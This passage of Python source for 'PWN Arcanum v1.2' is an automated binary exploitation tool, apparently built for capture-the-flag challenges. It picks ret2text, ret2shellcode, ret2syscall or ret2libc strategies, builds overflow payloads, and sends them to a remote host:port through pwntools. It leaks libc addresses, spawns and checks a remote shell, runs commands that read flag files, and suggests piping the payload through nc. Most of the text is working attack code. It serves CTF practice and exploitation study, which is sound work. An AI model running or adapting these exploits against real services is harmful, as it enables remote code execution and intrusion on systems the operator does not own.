        recommendations = []

        # Check for cat-flag gadgets -> highest priority ret2text
        if a.cat_flag_gadgets:
            for g in a.cat_flag_gadgets:
                recommendations.append(('ret2text', 95,
                    f"Found inline system(\"{g['string']}\") at {hex(g['addr'])}"))

        # Check for win function -> ret2text
        if a.win_funcs:
            for name, addr in a.win_funcs:
                if 'system' not in name.lower() and 'got.' not in name.lower() and 'plt.' not in name.lower():
                    recommendations.append(('ret2text', 90,
                        f"Found win function: {name} at {hex(addr)}"))

        # Also: system@plt + pop rdi + cat_flag string = ret2text with args
        has_system_plt = 'system' in a.plt
        has_pop_rdi = any(g[0] == 'pop rdi; ret' for g in a.gadgets)
        if has_system_plt and has_pop_rdi:
            # Check if there's a /bin/sh or cat flag string
            has_binsh = False
            try:
                if a.elf:
                    next(a.elf.search(b'/bin/sh'))
                    has_binsh = True
            except (StopIteration, Exception):
                pass
            if has_binsh:
                recommendations.append(('ret2text', 85,
                    "system@plt + pop rdi + /bin/sh -> system(\"/bin/sh\")"))

        # Check NX status
        nx_enabled = a.protections.get('NX', False)

        # If NX disabled -> ret2shellcode
        if not nx_enabled:
            recommendations.append(('ret2shellcode', 75,
                "NX disabled, shellcode on stack might work"))

        # Check for ROP gadgets -> ret2syscall
        if a.gadgets:
            gadget_names = [g[0] for g in a.gadgets]
            has_64 = self.analyzer.bits == 64
            if has_64:
                needed = ['pop rdi; ret', 'pop rsi; ret',
                          'pop rdx; ret', 'syscall']
            else:
                needed = ['int 0x80']
            found = [g for g in needed if g in gadget_names]
            if len(found) >= 3:
                try:
                    if a.elf and next(a.elf.search(b'/bin/sh'), None):
                        recommendations.append(('ret2syscall', 70,
                            f"Found {len(found)}/{len(needed)} gadgets + /bin/sh"))
                except: pass

        # ret2libc if we have PLT leak function + pop rdi
        if a.plt and a.got:
            has_leak = any(n in a.plt for n in ['puts', 'printf', 'write'])
            if has_leak and has_pop_rdi:
                recommendations.append(('ret2libc', 60,
                    "Has leak function + pop rdi gadget"))

        if not recommendations:
            recommendations.append(('manual', 0,
                "No automated strategy recommended, manual analysis needed"))

        # Sort by priority
        recommendations.sort(key=lambda x: x[1], reverse=True)
        return recommendations

    def build_payload(self, strategy='auto', offset=None, win_func=None,
                      shellcode_addr=None, args=None):
        """Build exploit payload for the given strategy."""
        # Use auto-detected offset if not specified
        if offset is None:
            if self.analyzer.auto_offset:
                offset = self.analyzer.auto_offset
                print(C.hit(f"Auto-detected offset: {offset} bytes"))
            else:
                print(C.warn("No offset specified, using default 112"))
                offset = 112
        self.offset = offset

        if strategy == 'auto':
            recs = self.recommend_strategy()
            if recs:
                strategy = recs[0][0]
                print(C.info(f"Auto-selected strategy: {strategy} "
                    f"({recs[0][2]})"))
            else:
                strategy = 'ret2text'

        self.strategy = strategy
        print(C.info(f"Building payload: strategy={strategy}, offset={offset}"))

        if strategy == 'ret2text':
            # If we found cat-flag gadgets and no explicit win_func, use the gadget addr
            if not win_func and self.analyzer.cat_flag_gadgets:
                gadget_addr = self.analyzer.cat_flag_gadgets[0]['addr']
                payload, desc = self.builder.ret2text(
                    offset, win_addr=gadget_addr,
                    win_name=f'cat_flag_gadget@{hex(gadget_addr)}', args=args)
            else:
                payload, desc = self.builder.ret2text(
                    offset, win_name=win_func, args=args)
        elif strategy == 'ret2shellcode':
            payload, desc = self.builder.ret2shellcode(
                offset, shellcode_addr=shellcode_addr)
        elif strategy == 'ret2syscall':
            payload, desc = self.builder.ret2syscall(offset)
        elif strategy == 'ret2libc':
            payload, desc = self.builder.ret2libc(
                offset, self.remote_host, self.remote_port)
        else:
            return None, f"Unknown strategy: {strategy}"

        if payload is None:
            print(C.err(f"Payload generation failed: {desc}"))
            return None, desc

        self.payload = payload
        self.payload_desc = desc
        print(C.hit(f"Payload built: {len(payload)} bytes"))
        print(C.info(f"  {desc}"))
        return payload, desc

    def run_remote(self, host, port, interactive=True):
        """Run exploit against remote target."""
        if not HAS_PWNTOOLS:
            print(C.err("pwntools required for remote exploitation"))
            return

        self.remote_host = host
        self.remote_port = port

        if self.strategy == 'ret2libc':
            # Two-stage exploit
            return self._run_ret2libc_remote(host, port, interactive)
        else:
            return self._run_single_stage_remote(host, port, interactive)

    def _run_single_stage_remote(self, host, port, interactive):
        """Run single-stage exploit (ret2text/ret2shellcode/ret2syscall)."""
        if not self.payload:
            print(C.err("No payload built. Call build_payload() first."))
            return

        print(C.info(f"Connecting to {host}:{port} ..."))
        try:
            io = remote(host, port)
        except Exception as e:
            print(C.err(f"Connection failed: {e}"))
            return

        # Step 1: Receive banner / prompt from the target
        try:
            banner = io.recv(timeout=3)
            if banner:
                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
        except Exception:
            pass  # No banner or connection immediately ready for input

        # Step 2: Send payload (sendline adds \n which gets() needs to return)
        print(C.info(f"Sending payload ({len(self.payload)} bytes) ..."))
        try:
            io.sendline(self.payload)
        except Exception as e:
            print(C.err(f"Send failed: {e}"))
            io.close()
            return

        # Step 3: Determine if this is a "cat flag" style exploit or a shell exploit
        is_cat_flag = (
            hasattr(self.analyzer, 'cat_flag_gadgets') and
            self.analyzer.cat_flag_gadgets and
            self.strategy in ('ret2text', 'auto')
        )

        if is_cat_flag:
            # cat-flag gadget: flag is printed to stdout, no shell
            print(C.info("cat-flag gadget detected, waiting for output ..."))
            time.sleep(0.5)
            try:
                data = io.recvall(timeout=5)
                if data:
                    decoded = data.decode('utf-8', errors='replace')
                    print(C.hit(f"Output:\n{decoded}"))
                    flags = self._extract_flags(data)
                    if flags:
                        for f in flags:
                            print(C.flag(f))
                    else:
                        print(C.warn("No flag pattern found in output"))
                else:
                    print(C.warn("No output received after payload"))
            except Exception as e:
                print(C.err(f"Receive error: {e}"))
            io.close()
            return

        # Shell-based exploit (ret2shellcode / ret2syscall / ret2text with real shell)
        if interactive:
            # Wait briefly for shell to spawn
            time.sleep(0.3)
            try:
                initial = io.recv(timeout=1)
                if initial:
                    print(C.sub(f"Initial output: {initial.decode('utf-8', errors='replace').strip()}"))
            except Exception:
                pass

            # Send a test command to verify shell is alive
            try:
                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
                time.sleep(0.5)
                check = io.recv(timeout=2)
                if b'PWN_ARCANUM_SHELL_OK' in check:
                    print(C.hit("Shell confirmed alive!"))
                    # Try to cat flag first
                    io.sendline(b'cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /home/*/flag* 2>/dev/null')
                    time.sleep(0.5)
                    try:
                        flag_data = io.recv(timeout=2)
                        if flag_data:
                            print(C.hit(f"Flag output: {flag_data.decode('utf-8', errors='replace').strip()}"))
                            flags = self._extract_flags(flag_data)
                            for f in flags:
                                print(C.flag(f))
                    except Exception:
                        pass
                else:
                    print(C.warn(f"Unexpected response: {check}"))
            except Exception:
                print(C.warn("No shell response, trying interactive anyway..."))

            print(C.hit("Switching to interactive mode (Ctrl+C to exit)"))
            try:
                io.interactive()
            except KeyboardInterrupt:
                print("\n" + C.info("Exiting interactive mode"))
        else:
            # Non-interactive: collect all output
            time.sleep(0.5)
            try:
                data = io.recvall(timeout=5)
                if data:
                    print(C.hit(f"Received: {data.decode('utf-8', errors='replace')}"))
                    flags = self._extract_flags(data)
                    for f in flags:
                        print(C.flag(f))
            except Exception:
                pass

        io.close()

    def _run_ret2libc_remote(self, host, port, interactive):
        """Run two-stage ret2libc exploit."""
        print(C.info(f"Stage 1: Leaking libc address from {host}:{port}"))

        # Build stage 1 payload
        stage1, desc = self.builder.ret2libc(
            self.offset, self.remote_host, self.remote_port)
        if stage1 is None:
            print(C.err(f"Stage 1 failed: {desc}"))
            return

        try:
            io = remote(host, port)
        except Exception as e:
            print(C.err(f"Connection failed: {e}"))
            return

        # Receive banner if any
        try:
            banner = io.recv(timeout=3)
            if banner:
                print(C.sub(f"Banner: {banner.decode('utf-8', errors='replace').strip()}"))
        except Exception:
            pass

        print(C.info(f"Sending stage 1 ({len(stage1)} bytes)"))
        io.sendline(stage1)

        # Receive leaked address
        try:
            leaked = io.recv(timeout=3)
            print(C.info(f"Received {len(leaked)} bytes"))
        except Exception as e:
            print(C.err(f"Receive failed: {e}"))
            io.close()
            return

        # Parse leaked address
        leaked_addr = self._parse_leaked_addr(leaked)
        if leaked_addr is None:
            print(C.err("Failed to parse leaked address"))
            print(C.info(f"Raw data: {leaked.hex()}"))
            io.close()
            return

        print(C.hit(f"Leaked address: {hex(leaked_addr)}"))

        # Calculate libc base
        if not self.libc_offsets:
            print(C.warn("No libc offsets specified, using Ubuntu 18.04 amd64"))
            self.libc_offsets = LIBC_OFFSETS["ubuntu18_amd64"]

        # The leaked address is puts@libc (or whatever we leaked)
        leak_got_name = None
        for name in ['puts', 'printf', 'write', '__libc_start_main']:
            if name in self.analyzer.got:
                leak_got_name = name
                break

        libc_func_offset = self.libc_offsets.get(leak_got_name, 0)
        if libc_func_offset == 0:
            print(C.err(f"No offset for {leak_got_name} in libc database"))
            print(C.info("Please specify --libc-offsets manually"))
            io.close()
            return

        libc_base = leaked_addr - libc_func_offset
        self.leaked_libc_base = libc_base
        print(C.hit(f"Libc base: {hex(libc_base)}"))

        # Build stage 2
        ret_gadget = None
        for name, addr in self.analyzer.gadgets:
            if name == 'ret':
                ret_gadget = addr
                break

        stage2, desc2 = self.builder.ret2libc_stage2(
            self.offset, libc_base,
            self.libc_offsets['system'],
            self.libc_offsets['binsh'],
            ret_gadget)

        print(C.info(f"Sending stage 2 ({len(stage2)} bytes): {desc2}"))

        # Wait a moment for the program to restart
        time.sleep(0.5)
        try:
            # May need to receive prompt first
            io.recv(timeout=1)
        except:
            pass

        io.sendline(stage2)

        if interactive:
            # Wait for shell to spawn
            time.sleep(0.3)
            try:
                initial = io.recv(timeout=1)
                if initial:
                    print(C.sub(f"Initial output: {initial.decode('utf-8', errors='replace').strip()}"))
            except Exception:
                pass

            # Send a test command to verify shell is alive
            try:
                io.sendline(b'echo PWN_ARCANUM_SHELL_OK')
                time.sleep(0.5)
                check = io.recv(timeout=2)
                if b'PWN_ARCANUM_SHELL_OK' in check:
                    print(C.hit("Shell confirmed alive!"))
                    # Try to cat flag first
                    io.sendline(b'cat /flag 2>/dev/null; cat flag.txt 2>/dev/null; cat /home/*/flag* 2>/dev/null')
                    time.sleep(0.5)
                    try:
                        flag_data = io.recv(timeout=2)
                        if flag_data:
                            print(C.hit(f"Flag output: {flag_data.decode('utf-8', errors='replace').strip()}"))
                            flags = self._extract_flags(flag_data)
                            for f in flags:
                                print(C.flag(f))
                    except Exception:
                        pass
                else:
                    print(C.warn(f"Unexpected response: {check}"))
            except Exception:
                print(C.warn("No shell response, trying interactive anyway..."))

            print(C.hit("Got shell! Switching to interactive mode"))
            try:
                io.interactive()
            except KeyboardInterrupt:
                print("\n" + C.info("Exiting"))
        else:
            time.sleep(0.5)
            try:
                data = io.recvall(timeout=5)
                if data:
                    print(C.hit(f"Received: {data.decode('utf-8', errors='replace')}"))
                    flags = self._extract_flags(data)
                    for f in flags:
                        print(C.flag(f))
            except Exception:
                pass

        io.close()

    def _parse_leaked_addr(self, data):
        """Parse a leaked address from received data."""
        if not data:
            return None
        # Try to extract address from raw bytes
        # The leaked address is usually at the start or after some prefix
        raw = data.strip()
        if self.analyzer.bits == 64:
            if len(raw) >= 6:
                # Take first 6 bytes (address is 6 bytes significant in x64)
                addr_bytes = raw[:6] + b'\x00\x00'
                return struct.unpack('<Q', addr_bytes)[0]
            elif len(raw) >= 4:
                addr_bytes = raw[:6].ljust(8, b'\x00')
                return struct.unpack('<Q', addr_bytes)[0]
        else:
            if len(raw) >= 4:
                return struct.unpack('<I', raw[:4])[0]
        return None

    def _extract_flags(self, data):
        """Extract flags from received data."""
        if isinstance(data, bytes):
            data = data.decode('utf-8', errors='replace')
        flags = []
        patterns = [
            r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'FLAG\{[^}]+\}',
        ]
        for p in patterns:
            flags.extend(re.findall(p, data, re.I))
        return list(dict.fromkeys(flags))


# ===================================================================
# CLI Entry Point
# ===================================================================
def main():
    parser = argparse.ArgumentParser(
        description='PWN Arcanum v1.2 - Automated PWN Analysis & Exploitation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Analyze binary only (static analysis)
  python pwn_arcanum.py ./pwn

  # Auto strategy, remote exploitation
  python pwn_arcanum.py ./pwn --remote host:port

  # Specific strategy
  python pwn_arcanum.py ./pwn --remote host:port --strategy ret2text
  python pwn_arcanum.py ./pwn --offset 112 --strategy ret2shellcode --sc-addr 0x404060

  # ret2libc with custom libc offsets
  python pwn_arcanum.py ./pwn --remote host:port --strategy ret2libc \\
      --libc-offsets system=0x4f440,binsh=0x1b3e1a,puts=0x809c0

  # Just generate payload, don't connect
  python pwn_arcanum.py ./pwn --offset 12 --strategy ret2text --func win --dump

Strategies:
  auto         Auto-detect best strategy (default)
  ret2text     Call win/backdoor function
  ret2shellcode Jump to shellcode on stack/bss
  ret2syscall  ROP chain for execve (need gadgets + /bin/sh)
  ret2libc     Leak libc + system("/bin/sh") (two-stage)
""")
    parser.add_argument('binary', help='Target binary file path')
    parser.add_argument('--remote', '-r', metavar='HOST:PORT',
                        help='Remote target (e.g., 1.2.3.4:9999)')
    parser.add_argument('--strategy', '-s', default='auto',
                        choices=['auto', 'ret2text', 'ret2shellcode',
                                 'ret2syscall', 'ret2libc'],
                        help='Exploitation strategy (default: auto)')
    parser.add_argument('--offset', '-o', type=int, default=None,
                        help='Overflow offset to return address')
    parser.add_argument('--func', '-f', default=None,
                        help='Win function name (for ret2text)')
    parser.add_argument('--sc-addr', type=str, default=None,
                        help='Shellcode address (for ret2shellcode)')
    parser.add_argument('--args', type=str, default=None,
                        help='Function args, comma-separated hex (for ret2text)')
    parser.add_argument('--libc-offsets', type=str, default=None,
                        help='Libc offsets: system=0xXXX,binsh=0xXXX,puts=0xXXX')
    parser.add_argument('--dump', action='store_true',
                        help='Dump payload as hex, do not connect')
    parser.add_argument('--no-interactive', action='store_true',
                        help='Do not enter interactive mode')
    parser.add_argument('--verbose', '-v', action='store_true',
                        help='Verbose output')

    args = parser.parse_args()

    print(BANNER)

    # Parse remote
    host, port = None, None
    if args.remote:
        if ':' in args.remote:
            host, port = args.remote.rsplit(':', 1)
            port = int(port)
        else:
            host = args.remote
            port = 9999

    # Parse shellcode addr
    sc_addr = None
    if args.sc_addr:
        sc_addr = int(args.sc_addr, 0)

    # Parse function args
    func_args = None
    if args.args:
        func_args = [int(x, 0) for x in args.args.split(',')]

    # Parse libc offsets
    libc_offsets = None
    if args.libc_offsets:
        libc_offsets = {}
        for kv in args.libc_offsets.split(','):
            k, v = kv.split('=')
            libc_offsets[k.strip()] = int(v, 0)

    # Initialize engine
    engine = PWNArcanum(args.binary, verbose=args.verbose)

    # Step 1: Analyze
    print(C.hdr("STEP 1: STATIC ANALYSIS"))
    engine.analyze()
    engine.print_report()
    print()

    # Step 2: Recommend strategy
    print(C.hdr("STEP 2: STRATEGY RECOMMENDATION"))
    recs = engine.recommend_strategy()
    for strat, priority, reason in recs:
        marker = C.GRN + ">>>" if strat == recs[0][0] else "   "
        print(f"  {marker} {strat:15s} (priority {priority:3d}): {reason}{C.RST}")
    print()

    # Step 3: Build payload
    print(C.hdr("STEP 3: PAYLOAD BUILDING"))
    payload, desc = engine.build_payload(
        strategy=args.strategy, offset=args.offset,
        win_func=args.func, shellcode_addr=sc_addr, args=func_args)
    if payload:
        print(C.hit(f"Payload ready ({len(payload)} bytes)"))
        if args.verbose or args.dump:
            print(C.sub("Payload hex dump"))
            for i in range(0, len(payload), 16):
                chunk = payload[i:i+16]
                hexstr = ' '.join(f'{b:02x}' for b in chunk)
                ascstr = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
                print(f"  {i:04x}: {hexstr:<48s} {ascstr}")
    print()

    # Step 4: Exploit
    if args.dump:
        print(C.info("--dump specified, skipping remote connection"))
        if payload is None:
            print(C.err("No payload generated, cannot save. Check strategy/offset."))
        else:
            # Save payload to file
            payload_file = os.path.join(
                os.path.dirname(args.binary) or '.',
                'payload.bin')
            with open(payload_file, 'wb') as f:
                f.write(payload)
            print(C.hit(f"Payload saved to {payload_file}"))
    elif host and port:
        print(C.hdr("STEP 4: REMOTE EXPLOITATION"))
        if libc_offsets:
            engine.libc_offsets = libc_offsets
        engine.run_remote(host, port, interactive=not args.no_interactive)
    elif args.strategy == 'ret2libc':
        print(C.warn("ret2libc requires --remote for two-stage exploitation"))
    else:
        print(C.info("No --remote specified. Use --dump to save payload,"))
        print(C.info("or --remote host:port to exploit."))
        print(C.info("Payload is ready to use with:"))
        print(C.info(f"  (cat payload.bin; cat) | nc <host> <port>"))

    print()
    print(C.hdr("DONE"))


if __name__ == '__main__':
    main()